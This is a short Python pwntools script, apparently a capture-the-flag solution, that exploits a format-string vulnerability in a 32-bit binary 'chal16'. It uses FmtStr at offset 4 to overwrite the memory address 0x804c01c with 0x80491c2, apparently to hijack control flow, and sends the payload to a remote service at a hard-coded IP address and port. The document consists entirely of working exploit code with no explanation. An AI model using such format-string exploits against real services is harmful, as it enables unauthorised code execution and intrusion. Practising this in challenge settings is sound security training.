from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

context.clear(arch = 'i386')

def send_payload(payload):
	s = process('./chal16')
	s.recvuntil("Ketik Nama anda : ")
	s.sendline(payload)
	r = s.recvall()
	return r

def send_fmt_payload(payload):
	log.info(repr(payload))
	#s = process('./chal16')
	s = remote('103.157.96.13', 7781)
	s.recvuntil("Ketik Nama anda : ")
	s.sendline(payload)
	r = s.recvall()
	print(r)


f = FmtStr(send_fmt_payload, offset=4)
f.write(0x804c01c, 0x80491c2)
f.execute_writes()
